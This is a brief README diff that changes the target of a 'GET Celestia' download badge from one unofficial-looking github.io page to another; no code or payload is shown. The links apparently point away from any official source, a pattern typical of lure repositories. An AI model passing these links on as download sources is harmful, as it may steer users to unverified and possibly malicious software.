@@ -3,7 +3,7 @@
 
 ![Celestia](https://storage.googleapis.com/job-listing-logos/93a672b2-c841-4e57-b76f-9cf5d94ba99b-1654092231244-1693471794734.png)
 
-[![GET Celestia](https://img.shields.io/badge/GET%20%E2%80%94%20Celestia-0078D6?style=for-the-badge&logoColor=white)](https://karenmitchelln447.github.io/.github/celestia-download)
+[![GET Celestia](https://img.shields.io/badge/GET%20%E2%80%94%20Celestia-0078D6?style=for-the-badge&logoColor=white)](https://space-celestia.github.io/.github/)
 
 ---
 
